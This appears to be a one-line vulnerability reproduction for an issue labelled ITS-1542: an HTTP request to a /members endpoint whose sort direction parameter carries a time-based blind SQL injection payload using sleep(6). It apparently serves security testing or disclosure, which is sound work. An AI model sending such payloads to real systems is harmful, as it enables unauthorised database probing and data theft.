# Vulnerable: ITS-1542
GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a)
